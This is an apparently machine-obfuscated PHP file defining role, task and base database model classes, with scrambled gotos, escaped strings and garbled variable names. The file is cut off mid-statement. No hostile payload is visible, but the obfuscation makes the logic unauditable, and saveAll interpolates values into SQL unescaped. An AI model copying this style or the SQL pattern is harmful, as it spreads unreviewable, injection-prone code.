<?php
 goto DåÁ²¿êá‡; F– ÒØŠÂ©: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\x2e\x72\157\x6c\145\114\x69\163\164"; public $field = array("\x6e\x61\x6d\x65", "\141\165\164\150", "\x6c\x61\142\145\x6c", "\144\151\x73\x70\x6c\x61\171", "\163\171\163\x74\x65\x6d", "\x64\145\x73\x63", "\x69\x67\156\157\162\x65\105\170\x74", "\x69\147\x6e\157\x72\x65\x46\151\x6c\145\x53\x69\x7a\145", "\141\x64\155\151\x6e\151\x73\x74\162\x61\x74\157\x72", "\x73\157\x72\164"); public function listData($DÑšÓ…¥ê = false, $Eñ§ï«Šœà = "\163\x6f\x72\164", $DÖŒŞÒ«‹ª = false) { $a¤ˆôÕŞ…Æ =& $_SERVER[Å¸ş]; $Dãï‹Ù¥ÅÚ = parent::listData($DÑšÓ…¥ê, $Eñ§ï«Šœà, $DÖŒŞÒ«‹ª); if (!$DÑšÓ…¥ê) { $Côïïùó¡ = $a¤ˆôÕŞ…Æ[2514]; foreach ($Dãï‹Ù¥ÅÚ as $B½´¹È®ï => $F¿Ñ±†ç–) { if ($F¿Ñ±†ç–[$a¤ˆôÕŞ…Æ[2294]] == 1) { $Dãï‹Ù¥ÅÚ[$B½´¹È®ï][$a¤ˆôÕŞ…Æ[405]] = $Côïïùó¡; } } } return $Dãï‹Ù¥ÅÚ; } public function update($D”¿ğİÎ»ˆ, $Dà½ù¬°ê) { goto CÃÄ”Ú¼´; CÃÄ”Ú¼´: $c……ÌˆÓˆÕ =& $_SERVER[Å¸ş]; $eÜˆˆÌ¶ = parent::listData($D”¿ğİÎ»ˆ); $Dİ˜‡¹½õ = $this->findByName($Dà½ù¬°ê[$c……ÌˆÓˆÕ[28]]); goto DÄÚİ¸‰Â¶; CÇ¿Ö¥®¹: return parent::update($D”¿ğİÎ»ˆ, $Dà½ù¬°ê); goto e¥ƒ÷æíŸÀ; DÄÚİ¸‰Â¶: if (!$eÜˆˆÌ¶ || $Dİ˜‡¹½õ && $Dİ˜‡¹½õ[$c……ÌˆÓˆÕ[367]] != $eÜˆˆÌ¶[$c……ÌˆÓˆÕ[367]]) { return !1; } if ($Dİ˜‡¹½õ[$c……ÌˆÓˆÕ[2294]] == 1) { $Dà½ù¬°ê = array($c……ÌˆÓˆÕ[28] => $Dà½ù¬°ê[$c……ÌˆÓˆÕ[28]], $c……ÌˆÓˆÕ[2127] => $Dà½ù¬°ê[$c……ÌˆÓˆÕ[2127]]); } $this->filterAuth($Dà½ù¬°ê[$c……ÌˆÓˆÕ[376]]); goto CÇ¿Ö¥®¹; e¥ƒ÷æíŸÀ: } public function remove($E½‡ˆÙ›Ë) { $DÈáÃ²´¹ = parent::listData($E½‡ˆÙ›Ë); if (!$DÈáÃ²´¹ || $DÈáÃ²´¹[$_SERVER[Å¸ş][1078]]) { return !1; } return parent::remove($E½‡ˆÙ›Ë); } public function add($AâÀšó°œÕ) { goto CòÕ³Š¬Øæ; CòÕ³Š¬Øæ: $C››İôğŠ› =& $_SERVER[Å¸ş]; $c£„é“Œğ = $AâÀšó°œÕ[$C››İôğŠ›[28]]; if ($this->findByName($c£„é“Œğ)) { return !1; } goto fÙÌ¶®Üé; B›ïäëÓ˜Ó: return parent::insert($AâÀšó°œÕ); goto D‚²À‰Øåá; fÙÌ¶®Üé: $aİ†…ƒãÜ¸ = array($C››İôğŠ›[386] => $c£„é“Œğ, $C››İôğŠ›[2114] => $C››İôğŠ›[33], $C››İôğŠ›[2110] => $C››İôğŠ›[2128], $C››İôğŠ›[2515] => 1, $C››İôğŠ›[2113] => 0, $C››İôğŠ›[2516] => 0, $C››İôğŠ›[2112] => $this->getSort()); $AâÀšó°œÕ = array_merge($aİ†…ƒãÜ¸, $AâÀšó°œÕ); $this->filterAuth($AâÀšó°œÕ[$C››İôğŠ›[376]]); goto B›ïäëÓ˜Ó; D‚²À‰Øåá: } private function getSort() { $dÅ„İ¶¿ÉÛ =& $_SERVER[Å¸ş]; $Aˆèù‡Ä ¨ = parent::listData(); $CæÕ÷Ş‹ = array_to_keyvalue($Aˆèù‡Ä ¨, $dÅ„İ¶¿ÉÛ[33], $dÅ„İ¶¿ÉÛ[2130]); return empty($CæÕ÷Ş‹) ? 0 : max($CæÕ÷Ş‹) + 1; } private function filterAuth(&$c¬èÓ®Ÿ) { $C«¼Ôá‡ =& $_SERVER[Å¸ş]; $Dğ›¼é¾Ë = array(); $Cìë¢—“¯ø = array_filter(explode($C«¼Ôá‡[47], $c¬èÓ®Ÿ)); foreach ($Cìë¢—“¯ø as $c¬èÓ®Ÿ) { $EÜ‘åÁœĞ¤ = explode($C«¼Ôá‡[91], $c¬èÓ®Ÿ); if ($EÜ‘åÁœĞ¤[0] == $C«¼Ôá‡[1785] && $EÜ‘åÁœĞ¤[1] != $C«¼Ôá‡[1034]) { $c£ó³Ìå„¦ = $EÜ‘åÁœĞ¤[0] . $C«¼Ôá‡[91] . $EÜ‘åÁœĞ¤[1] . $C«¼Ôá‡[2517]; if (!in_array($c£ó³Ìå„¦, $Cìë¢—“¯ø)) { $Dğ›¼é¾Ë[] = $c£ó³Ìå„¦; } } $Dğ›¼é¾Ë[] = $c¬èÓ®Ÿ; } $c¬èÓ®Ÿ = implode($C«¼Ôá‡[47], $Dğ›¼é¾Ë); } public function sort($C‹ãœÚ¾å, $fŒŞï¯ĞÅ·) { return parent::update($C‹ãœÚ¾å, $fŒŞï¯ĞÅ·); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\x6d\x2e\164\141\163\153\114\x69\x73\x74"; public $field = array("\x6e\x61\155\x65", "\164\171\160\x65", "\x65\x76\145\x6e\164", "\x74\x69\155\145", "\144\145\x73\x63", "\x73\171\x73\x74\x65\155", "\145\x6e\141\x62\154\x65", "\154\x61\x73\x74\x52\x75\156", "\x73\157\x72\164"); public function listData($BƒŸèƒˆÇ = false, $f…İ¦±Îèê = "\163\157\162\164", $C¬Öµù±²¯ = false) { return parent::listData($BƒŸèƒˆÇ, $f…İ¦±Îèê, $C¬Öµù±²¯); } public function add($dÈëÇÅÛ«) { $a™ªÒ°¾ØÆ =& $_SERVER[Å¸ş]; $e¼’ÇÑàİ‘ = $this->findByName($dÈëÇÅÛ«[$a™ªÒ°¾ØÆ[28]]); if ($e¼’ÇÑàİ‘) { return !1; } $dÈëÇÅÛ«[$a™ªÒ°¾ØÆ[1401]] = 0; $dÈëÇÅÛ«[$a™ªÒ°¾ØÆ[2130]] = $this->getSort(); return parent::insert($dÈëÇÅÛ«); } private function getSort() { $dæ†«å¹ñù =& $_SERVER[Å¸ş]; $dè°†Ø­…œ = parent::listData(); $a«„”ï‚ë÷ = array_to_keyvalue($dè°†Ø­…œ, $dæ†«å¹ñù[33], $dæ†«å¹ñù[2130]); return empty($a«„”ï‚ë÷) ? 0 : max($a«„”ï‚ë÷) + 1; } public function update($cÒÌÉ…¾±”, $BÁŒ’›ÕŞ) { $EáÁ³ùÙ =& $_SERVER[Å¸ş]; $f²¤ç‚“ = $this->listData($cÒÌÉ…¾±”); $dó†ÅÙ‰Âğ = $this->findByName($BÁŒ’›ÕŞ[$EáÁ³ùÙ[28]]); if (!$f²¤ç‚“ || $dó†ÅÙ‰Âğ && $dó†ÅÙ‰Âğ[$EáÁ³ùÙ[367]] != $f²¤ç‚“[$EáÁ³ùÙ[367]]) { return !1; } return parent::update($cÒÌÉ…¾±”, $BÁŒ’›ÕŞ); } public function remove($fÁ±ŸãÏö–, $B–¶¤“—İÚ = false) { $dë¸´…ˆ¬ =& $_SERVER[Å¸ş]; $B†®ê­¨Ğ = $this->listData($fÁ±ŸãÏö–); if (!$B†®ê­¨Ğ) { return; } if (!$B–¶¤“—İÚ && $B†®ê­¨Ğ[$dë¸´…ˆ¬[1078]] == $dë¸´…ˆ¬[83]) { return !1; } return parent::remove($fÁ±ŸãÏö–); } public function enable($A±Î‚ëÕ¹, $d®Œ“†øÔ) { return $this->update($A±Î‚ëÕ¹, array($_SERVER[Å¸ş][2508] => $d®Œ“†øÔ)); } public function run($CÜœáº¸‡) { return $this->update($CÜœáº¸‡, array($_SERVER[Å¸ş][2518] => time())); } } goto D£‹õç²Ò…; BĞ—šÄ‹Ú: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\144\x69\146\x79\124\x69\x6d\x65", "\x74\x69\x6d\x65", "\x69\x6e\163\145\x72\x74\x2c\165\160\144\x61\x74\145", "\x66\165\x6e\x63\x74\x69\x6f\156"), array("\x63\x72\145\x61\x74\x65\x54\x69\x6d\x65", "\x74\x69\x6d\145", "\x69\156\x73\145\x72\x74", "\x66\x75\156\x63\x74\x69\157\x6e")); public function setDataAuto($eê³ğ¤Á±¾) { $this->dataAuto = $eê³ğ¤Á±¾; } public function __construct($Bƒø»ˆäÇ§ = '', $c¨áåäà‡ = '', $c®éöĞÌŠ = '') { parent::__construct($Bƒø»ˆäÇ§, $c¨áåäà‡, $c®éöĞÌŠ); } public static function textEncode($fÉÏìøçË†) { if (!$fÉÏìøçË†) { return $fÉÏìøçË†; } $B‘÷ä‚©ƒŠ = json_encode($fÉÏìøçË†); $B‘÷ä‚©ƒŠ = preg_replace_callback($_SERVER[Å¸ş][342], function ($fÖ¨ãÈê…) { return addslashes($fÖ¨ãÈê…[0]); }, $B‘÷ä‚©ƒŠ); return json_decode($B‘÷ä‚©ƒŠ); } public static function textDecode($Aî‡­õÇÎ«) { $e»Ò–Ú…”Û =& $_SERVER[Å¸ş]; $e™ñ—«…À£ = json_encode($Aî‡­õÇÎ«); $e™ñ—«…À£ = preg_replace_callback($e»Ò–Ú…”Û[343], function ($BÇ¶Œóµ‚) { return $_SERVER[Å¸ş][93]; }, $e™ñ—«…À£); return json_decode($e™ñ—«…À£); } protected $tableMeta = array(); protected function _beforeInsert(&$FËù…†ÎŞÕ, $CÛˆÕİä‚Ä) { $F¯ ²äñÚ¯ =& $_SERVER[Å¸ş]; if (!$this->checkDataAutoHas($F¯ ²äñÚ¯[344])) { return; } $this->dataBeforeFilter($FËù…†ÎŞÕ, $F¯ ²äñÚ¯[344]); } protected function _beforeUpdate(&$C„àˆš¾Ÿµ, $båæ²ÍÑ¿‰) { $cÑõ‰˜±° =& $_SERVER[Å¸ş]; if (!$this->checkDataAutoHas($cÑõ‰˜±°[345])) { return; } $this->dataBeforeFilter($C„àˆš¾Ÿµ, $cÑõ‰˜±°[345]); } protected function _afterSelect(&$e©¯Èù…“–, $e’Ò‹‘¡) { if (!is_array($e©¯Èù…“–)) { return; } if (!$this->checkDataAutoHas($_SERVER[Å¸ş][346])) { return; } foreach ($e©¯Èù…“– as &$F¬÷ŠƒÔ±‘) { $this->dataAfterFilter($F¬÷ŠƒÔ±‘); } unset($F¬÷ŠƒÔ±‘); } protected function _afterFind(&$B×çêİÉ†î, $cÕÓ¹˜ëßˆ) { if (!is_array($B×çêİÉ†î)) { return; } if (!$this->checkDataAutoHas($_SERVER[Å¸ş][346])) { return; } $this->dataAfterFilter($B×çêİÉ†î); } public function setAutoIncrement($EÚë’ÃÌŞ) { $e‘‘ĞÂâŞ” = array($this->getPk() => $EÚë’ÃÌŞ); $A±®çç…ßÑ = $this->data($e‘‘ĞÂâŞ”)->add(); if ($A±®çç…ßÑ) { $this->delete($A±®çç…ßÑ); } } public function getAutoIncrement() { $A’êØ¾¹› = $this->getTableName(); $Aù‡ÚÌäÆ“ = $this->max($this->getPk()); $eÂ‚…ÚÀÓ = $this->query("\x73\150\x6f\x77\40\x74\x61\x62\154\x65\x20\x73\164\141\x74\x75\163\40\167\x68\x65\162\x65\40\116\141\155\x65\75\x27{$A’êØ¾¹›}\x27"); $EŞ×«ôñ¶ = $eÂ‚…ÚÀÓ[0][$_SERVER[Å¸ş][347]]; $A¦ŞÜØÉ = max($Aù‡ÚÌäÆ“, $EŞ×«ôñ¶); return $A¦ŞÜØÉ; } protected function _callBefore($CÆ®æõ÷ô, $f·ËÑñÑë) { return $this->cacheCallCheck($CÆ®æõ÷ô, $f·ËÑñÑë, !1); } protected function _callAfter($Bí§Ñ•ƒ‡, $aİİ×‹âƒ) { return $this->cacheCallCheck($Bí§Ñ•ƒ‡, $aİİ×‹âƒ, !0); } protected function cacheFunctionAlias($fÜÎ¶œà) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($CàİØÊ§…, $c²Åˆó‹„°, $d‹«³ª®Ë = false) { $C‡Ó¿†Í¨Ø = $this->cacheFunctionAlias($c²Åˆó‹„°); if (!$C‡Ó¿†Í¨Ø) { return; } foreach ($C‡Ó¿†Í¨Ø as $E‹¨ÓÊ°ä… => $AÛÓ«º¤ê¢) { $DÕğğÂ…¸ = $AÛÓ«º¤ê¢[0]; $Fªï­Ò¦½¤ = explode($_SERVER[Å¸ş][47], $AÛÓ«º¤ê¢[1]); if ($CàİØÊ§… == $E‹¨ÓÊ°ä…) { return $this->cacheFunctionGet($E‹¨ÓÊ°ä…, $DÕğğÂ…¸); } if ($d‹«³ª®Ë && in_array($CàİØÊ§…, $Fªï­Ò¦½¤)) { $this->cacheFunctionClear($E‹¨ÓÊ°ä…, $DÕğğÂ…¸); } } } public function cacheFunctionGet($déÑâÏàÉ, $AƒõğÈ±İç) { $DËØ¶ªÓ®£ = $this->cacheKeyMake($déÑâÏàÉ, $AƒõğÈ±İç); $Aö£‡ãŞˆ = Cache::get($DËØ¶ªÓ®£); if (!is_array($Aö£‡ãŞˆ)) { $Aö£‡ãŞˆ = call_user_func_array(array($this, $déÑâÏàÉ), array($AƒõğÈ±İç, !0)); Cache::set($DËØ¶ªÓ®£, $Aö£‡ãŞˆ); } return $Aö£‡ãŞˆ; } public function cacheFunctionClear($B¹„ô«»ÃÃ, $c¨ì³ó±ïñ) { $F™³„‘¬êÓ = $c¨ì³ó±ïñ; if (!is_array($c¨ì³ó±ïñ)) { $F™³„‘¬êÓ = array($c¨ì³ó±ïñ); } foreach ($F™³„‘¬êÓ as $EÏŒĞ¸àÊ£) { $EÎŞ‘›‘ = $this->cacheKeyMake($B¹„ô«»ÃÃ, $EÏŒĞ¸àÊ£); Cache::remove($EÎŞ‘›‘); } } private function cacheKeyMake($AÍŠÅÛŠÈæ, $fŒ‰ˆ¬Õ) { $dŸº© ÚÒ‰ =& $_SERVER[Å¸ş]; return get_class($this) . $dŸº© ÚÒ‰[70] . $AÍŠÅÛŠÈæ . $dŸº© ÚÒ‰[348] . $fŒ‰ˆ¬Õ; } protected function selectPage($c˜ØŸ¡Œß° = 200, $Féââä²•Á = 1) { goto A‹¿¸µùŠ“; a˜ÅÒ«òÛ: $f¸”Êá³Î = $A°îÁÚç¶…; $f¸”Êá³Î[$D‡÷ãÏ¹Œƒ[350]] = array(); $this->optionsValue($f¸”Êá³Î); goto B˜Ç²Ú®÷Ç; d›¬¹É¦Ã‘: $this->optionsValue($A°îÁÚç¶…); $Bë˜ŞÈ‚ö = $this->page($Féââä²•Á, $c˜ØŸ¡Œß°)->select(); $Bë˜ŞÈ‚ö = is_array($Bë˜ŞÈ‚ö) ? $Bë˜ŞÈ‚ö : array(); goto C­ÀŒé›–í; a¦¾âøÓò‚: $BÁÇ™”¶‚ï = 4000; $c˜ØŸ¡Œß° = isset($in[$D‡÷ãÏ¹Œƒ[349]]) ? $in[$D‡÷ãÏ¹Œƒ[349]] : $c˜ØŸ¡Œß°; if ($c˜ØŸ¡Œß° === -1) { unset($in[$D‡÷ãÏ¹Œƒ[349]]); $BÁÇ™”¶‚ï = 100000000; $c˜ØŸ¡Œß° = $BÁÇ™”¶‚ï; } goto a˜ÅÒ«òÛ; A‹¿¸µùŠ“: $D‡÷ãÏ¹Œƒ =& $_SERVER[Å¸ş]; global $in; $A°îÁÚç¶… = $this->optionsValue(); goto a¦¾âøÓò‚; BÙßæÁğÒ: $añÊ³òÕÅ = ceil($FÇÛôß¯•µ / $c˜ØŸ¡Œß°); $Féââä²•Á = intval(isset($in[$D‡÷ãÏ¹Œƒ[340]]) ? $in[$D‡÷ãÏ¹Œƒ[340]] : $Féââä²•Á); $Féââä²•Á = $Féââä²•Á <= 1 ? 1 : ($Féââä²•Á >= $añÊ³òÕÅ ? $añÊ³òÕÅ : $Féââä²•Á); goto d›¬¹É¦Ã‘; B˜Ç²Ú®÷Ç: $FÇÛôß¯•µ = intval($this->count()); $c˜ØŸ¡Œß° = intval($c˜ØŸ¡Œß°); $c˜ØŸ¡Œß° = $c˜ØŸ¡Œß° <= 5 ? 5 : ($c˜ØŸ¡Œß° >= $BÁÇ™”¶‚ï ? $BÁÇ™”¶‚ï : $c˜ØŸ¡Œß°); goto BÙßæÁğÒ; C­ÀŒé›–í: if ($añÊ³òÕÅ == 1) { $FÇÛôß¯•µ = count($Bë˜ŞÈ‚ö); } $EïÔ³ÈÉ™Í = array($D‡÷ãÏ¹Œƒ[351] => array($D‡÷ãÏ¹Œƒ[352] => $FÇÛôß¯•µ, $D‡÷ãÏ¹Œƒ[349] => $c˜ØŸ¡Œß°, $D‡÷ãÏ¹Œƒ[340] => $Féââä²•Á, $D‡÷ãÏ¹Œƒ[353] => $añÊ³òÕÅ), $D‡÷ãÏ¹Œƒ[354] => $Bë˜ŞÈ‚ö ? $Bë˜ŞÈ‚ö : array()); return $EïÔ³ÈÉ™Í; goto Dáè¢‹ïÕ†; Dáè¢‹ïÕ†: } protected function checkLength($e©…¼ìŠ‡, $FĞ‰Ë™ğÊº = 0, $DáŠİÊôÓ = '') { $FŸ¶„âì´Ì =& $_SERVER[Å¸ş]; $FĞ‰Ë™ğÊº = $FĞ‰Ë™ğÊº ? $FĞ‰Ë™ğÊº : 65536; if (!$e©…¼ìŠ‡ || strlen($e©…¼ìŠ‡) < $FĞ‰Ë™ğÊº) { return; } $DáŠİÊôÓ = $DáŠİÊôÓ ? $DáŠİÊôÓ . $FŸ¶„âì´Ì[67] : $FŸ¶„âì´Ì[33]; show_json($DáŠİÊôÓ . LNG($FŸ¶„âì´Ì[355]) . "\50{$FĞ‰Ë™ğÊº}\x29", !1); } protected function metaSet($eã¨ÖŒİì´, $A£¾‚Ú‡Ò¤ = null, $DÚá²åÕáæ = null) { goto CŠò‡†’; CŠò‡†’: $a›ğ¬Ë™¡Ğ =& $_SERVER[Å¸ş]; if (!$this->tableMeta) { return !1; } $B©§Ï‰†Æ¾ = $this->tableMeta[$a›ğ¬Ë™¡Ğ[356]]; goto Fë•–œÇé™; Fë•–œÇé™: $Fø«¦·æ£Â = $this->tableMeta[$a›ğ¬Ë™¡Ğ[357]]; $fÌ©•¨† = Model($Fø«¦·æ£Â); $FİŸÏ©¢‚È = array($B©§Ï‰†Æ¾ => $eã¨ÖŒİì´, $a›ğ¬Ë™¡Ğ[358] => $A£¾‚Ú‡Ò¤); goto d‡ÃĞñê; b¬ò³­ƒÌë: if (is_string($A£¾‚Ú‡Ò¤)) { $FÅ¼©×ˆõ[$A£¾‚Ú‡Ò¤] = $DÚá²åÕáæ; } $c°‘¡œ”Èø = array(); foreach ($FÅ¼©×ˆõ as $EÀÊ¦Š³œï => $DÇƒº†æ‘) { $this->checkLength($DÇƒº†æ‘, !1, $Fø«¦·æ£Â . $a›ğ¬Ë™¡Ğ[4] . $EÀÊ¦Š³œï); $c°‘¡œ”Èø[] = array($B©§Ï‰†Æ¾ => $eã¨ÖŒİì´, $a›ğ¬Ë™¡Ğ[89] => $EÀÊ¦Š³œï, $a›ğ¬Ë™¡Ğ[359] => $DÇƒº†æ‘); } goto bõëêôİƒ‡; d‡ÃĞñê: if (is_null($A£¾‚Ú‡Ò¤)) { return $fÌ©•¨†->where(array($B©§Ï‰†Æ¾ => $eã¨ÖŒİì´))->delete(); } if (is_null($DÚá²åÕáæ) && is_string($A£¾‚Ú‡Ò¤)) { return $fÌ©•¨†->where($FİŸÏ©¢‚È)->delete(); } $FÅ¼©×ˆõ = is_array($A£¾‚Ú‡Ò¤) ? $A£¾‚Ú‡Ò¤ : array(); goto b¬ò³­ƒÌë; bõëêôİƒ‡: $fÌ©•¨†->where(array($B©§Ï‰†Æ¾ => $eã¨ÖŒİì´))->addAll($c°‘¡œ”Èø, array(), !0); return !0; goto CÔâç”ïù; CÔâç”ïù: } public function metaGet($aºßÕ‚Öåõ, $dö‰¹ØŞ¶ = false) { goto eéÂë¹äĞ¤; AšëÊï¬: $eî©®‡İœİ = $C°ÈãÀ¹¥->field($cŒÂ»Û¡…œ[360])->where($cš©ŠŒ´¬)->select(); $eî©®‡İœİ = array_to_keyvalue($eî©®‡İœİ, $cŒÂ»Û¡…œ[89], $cŒÂ»Û¡…œ[359]); return $eî©®‡İœİ; goto DÔÜØ¦Ê¤É; cÜ§¥É”½Ã: $C°ÈãÀ¹¥ = Model($this->tableMeta[$cŒÂ»Û¡…œ[357]]); if ($dö‰¹ØŞ¶) { $cš©ŠŒ´¬ = array($d­¿ôêëš½ => $aºßÕ‚Öåõ, $cŒÂ»Û¡…œ[89] => $dö‰¹ØŞ¶); return $C°ÈãÀ¹¥->where($cš©ŠŒ´¬)->getField($cŒÂ»Û¡…œ[359]); } $cš©ŠŒ´¬ = array($d­¿ôêëš½ => $aºßÕ‚Öåõ); goto AšëÊï¬; eéÂë¹äĞ¤: $cŒÂ»Û¡…œ =& $_SERVER[Å¸ş]; if (!$this->tableMeta) { return array(); } $d­¿ôêëš½ = $this->tableMeta[$cŒÂ»Û¡…œ[356]]; goto cÜ§¥É”½Ã; DÔÜØ¦Ê¤É: } private function checkDataAutoHas($bŒ½ÖéìÙØ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $aÀŸ„¹ï¼) { if (in_array($bŒ½ÖéìÙØ, explode($_SERVER[Å¸ş][47], $aÀŸ„¹ï¼[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$f¯®÷‹Î§”, $d¿™‘Ú›½) { $A–çÇ»Âó =& $_SERVER[Å¸ş]; foreach ($this->dataAuto as $FøÒ‡ƒœ…Ë) { $bô—ÂÇß‰÷ = $FøÒ‡ƒœ…Ë[0]; if (!in_array($d¿™‘Ú›½, explode($A–çÇ»Âó[47], $FøÒ‡ƒœ…Ë[2]))) { continue; } switch (trim($FøÒ‡ƒœ…Ë[3])) { case $A–çÇ»Âó[309]: case $A–çÇ»Âó[310]: $fÒôÌ‡äí× = $FøÒ‡ƒœ…Ë[1]; $fß¿»ãš¤® = isset($FøÒ‡ƒœ…Ë[4]) ? (array) $FøÒ‡ƒœ…Ë[4] : array(); if ($fÒôÌ‡äí× == $A–çÇ»Âó[190] && array_key_exists($bô—ÂÇß‰÷, $f¯®÷‹Î§”)) { if (!$f¯®÷‹Î§”[$bô—ÂÇß‰÷]) { unset($f¯®÷‹Î§”[$bô—ÂÇß‰÷]); } break; } if (isset($f¯®÷‹Î§”[$bô—ÂÇß‰÷])) { array_unshift($fß¿»ãš¤®, $f¯®÷‹Î§”[$bô—ÂÇß‰÷]); } if ($A–çÇ»Âó[309] == $FøÒ‡ƒœ…Ë[3]) { $f¯®÷‹Î§”[$bô—ÂÇß‰÷] = call_user_func_array($fÒôÌ‡äí×, $fß¿»ãš¤®); } else { $f¯®÷‹Î§”[$bô—ÂÇß‰÷] = call_user_func_array(array(&$this, $fÒôÌ‡äí×), $fß¿»ãš¤®); } break; case $A–çÇ»Âó[261]: $f¯®÷‹Î§”[$bô—ÂÇß‰÷] = $f¯®÷‹Î§”[$FøÒ‡ƒœ…Ë[1]]; break; case $A–çÇ»Âó[282]: if (isset($f¯®÷‹Î§”[$bô—ÂÇß‰÷]) && !is_string($f¯®÷‹Î§”[$bô—ÂÇß‰÷])) { $f¯®÷‹Î§”[$bô—ÂÇß‰÷] = json_encode_force($f¯®÷‹Î§”[$bô—ÂÇß‰÷]); } break; case $A–çÇ»Âó[311]: if ($f¯®÷‹Î§”[$bô—ÂÇß‰÷] === $A–çÇ»Âó[33]) { unset($f¯®÷‹Î§”[$bô—ÂÇß‰÷]); } break; case $A–çÇ»Âó[312]: $f¯®÷‹Î§”[$bô—ÂÇß‰÷] = $FøÒ‡ƒœ…Ë[1]; default: break; } } if ($d¿™‘Ú›½ == $A–çÇ»Âó[344]) { $f®¼ƒËÄÅ = strtolower($this->db->getDbType()); if (strpos($f®¼ƒËÄÅ, $A–çÇ»Âó[9]) !== 0) { return; } $b©çõ‰Ÿï¢ = $this->field(!0)->fields; $a­ğ¦ŠÉ¥ = $b©çõ‰Ÿï¢[$A–çÇ»Âó[240]]; if (isset($b©çõ‰Ÿï¢[$A–çÇ»Âó[239]])) { unset($a­ğ¦ŠÉ¥[$b©çõ‰Ÿï¢[$A–çÇ»Âó[239]]]); } foreach ($a­ğ¦ŠÉ¥ as $aî­ßÀ‡’Ú => $d¿™‘Ú›½) { if (!isset($f¯®÷‹Î§”[$aî­ßÀ‡’Ú])) { $f¯®÷‹Î§”[$aî­ßÀ‡’Ú] = $A–çÇ»Âó[33]; } } } } private function dataAfterFilter(&$D¡æ¬î¨¨) { $Aì¦âŞ÷¥” =& $_SERVER[Å¸ş]; foreach ($this->dataAuto as $Fôî™‡‘ß) { $CŠÈóœ = $Fôî™‡‘ß[0]; if (!in_array($Aì¦âŞ÷¥”[346], explode($Aì¦âŞ÷¥”[47], $Fôî™‡‘ß[2]))) { continue; } if (!isset($D¡æ¬î¨¨[$CŠÈóœ])) { continue; } switch (trim($Fôî™‡‘ß[3])) { case $Aì¦âŞ÷¥”[309]: case $Aì¦âŞ÷¥”[310]: $c§¾¤†’ëë = isset($Fôî™‡‘ß[4]) ? (array) $Fôî™‡‘ß[4] : array(); array_unshift($c§¾¤†’ëë, $D¡æ¬î¨¨[$CŠÈóœ]); if ($Aì¦âŞ÷¥”[309] == $Fôî™‡‘ß[3]) { $D¡æ¬î¨¨[$CŠÈóœ] = call_user_func_array($Fôî™‡‘ß[1], $c§¾¤†’ëë); } else { $D¡æ¬î¨¨[$CŠÈóœ] = call_user_func_array(array(&$this, $Fôî™‡‘ß[1]), $c§¾¤†’ëë); } break; case $Aì¦âŞ÷¥”[261]: $D¡æ¬î¨¨[$CŠÈóœ] = $D¡æ¬î¨¨[$Fôî™‡‘ß[1]]; break; case $Aì¦âŞ÷¥”[282]: $BØ«¶“›…å = $D¡æ¬î¨¨[$CŠÈóœ]; $D¡æ¬î¨¨[$CŠÈóœ] = json_decode($BØ«¶“›…å, !0); if (is_null($D¡æ¬î¨¨[$CŠÈóœ])) { $D¡æ¬î¨¨[$CŠÈóœ] = $BØ«¶“›…å; } break; case $Aì¦âŞ÷¥”[311]: if ($D¡æ¬î¨¨[$CŠÈóœ] === $Aì¦âŞ÷¥”[33]) { unset($D¡æ¬î¨¨[$CŠÈóœ]); } break; case $Aì¦âŞ÷¥”[312]: $D¡æ¬î¨¨[$CŠÈóœ] = $Fôî™‡‘ß[1]; default: break; } } } public function saveAll($B‡é˜Åå´) { goto b»¾ŞÓ¸¢; DŠÑùƒ»²µ: $B‡é˜Åå´ = is_array($B‡é˜Åå´) ? $B‡é˜Åå´ : array(); $cÀ”­¸ˆÄõ = $a¥ùË§ÅÉ[361]; $AÓƒÔî» = 0; goto E÷¤§ó®Øò; E÷¤§ó®Øò: $FÑç‹ëå = array(); $c±ª‡‰öš = count($B‡é˜Åå´); for ($AµçôÎÑò = 0; $AµçôÎÑò < $c±ª‡‰öš; $AµçôÎÑò++) { $aŠ‰¤‰ ° = $B‡é˜Åå´[$AµçôÎÑò]; if (!is_array($aŠ‰¤‰ °) || count($aŠ‰¤‰ °) != 4) { continue; } $Aäñâ‰§Ÿ¼ = "\125\x50\x44\x41\x54\105\x20\x60{$cê¶òîˆÕ}\140\40\123\x45\124\40{$aŠ‰¤‰ °[2]}\x20\x3d\x20\x43\x41\x53\105\40{$aŠ‰¤‰ °[0]}\x20\xa"; if ($AÓƒÔî» == 0) { $cÀ”­¸ˆÄõ = $Aäñâ‰§Ÿ¼; } $FÑç‹ëå[] = $a¥ùË§ÅÉ[113] . $aŠ‰¤‰ °[1] . $a¥ùË§ÅÉ[113]; $AÓƒÔî»++; $cÀ”­¸ˆÄõ .= "\x20\x57\110\105\116\40\47{$aŠ‰¤‰ °[1]}\47\x20\x54\x48\x45\116\40\47{$aŠ‰¤‰ °[3]}\x27\x20\xa"; if ($AÓƒÔî» == $cˆ¨¼ÀÚÎÀ || $AµçôÎÑò == $c±ª‡‰öš - 1) { goto fˆ·…†í±ğ; fˆ·…†í±ğ: $c™‰Ò£¶ê = implode($a¥ùË§ÅÉ[47], $FÑç‹ëå); $cÀ”­¸ˆÄõ .= "\x20\x45\116\x44\x20\x20\x57\110\x45\122\x45\40{$aŠ‰¤‰ °[0]}\40\x49\116\x20\50{$c™‰Ò£¶ê}\51\x20"; $this->execute($cÀ”­¸ˆÄõ); goto eÄË«Õ†ß°; BƒÓÕ³ÆÓ–: $FÑç‹ëå = array(); goto díÓïš™‹”; eÄË«Õ†ß°: $AÓƒÔî» = 0; $cÀ”­¸ˆÄõ = $Aäñâ‰§Ÿ¼; $this->chunkEventCheck(count($FÑç‹ëå)); goto BƒÓÕ³ÆÓ–; díÓïš™‹”: } } goto b¯ˆ‹·ÔÍÉ; b»¾ŞÓ¸¢: $a¥ùË§ÅÉ =& $_SERVER[Å¸ş]; $cê¶òîˆÕ = $this->tablePrefix . $this->tableName; $cˆ¨¼ÀÚÎÀ = self::SQL_WHERE_IN_CHUNK; goto DŠÑùƒ»²µ; b¯ˆ‹·ÔÍÉ: $this->chunkEventSet(); goto D¨ŒÀ¯Ã”ä; D¨ŒÀ¯Ã”ä: } public function saveAllEach($aäÖàœÙ›) { $Fß†°éÛ¶ø =& 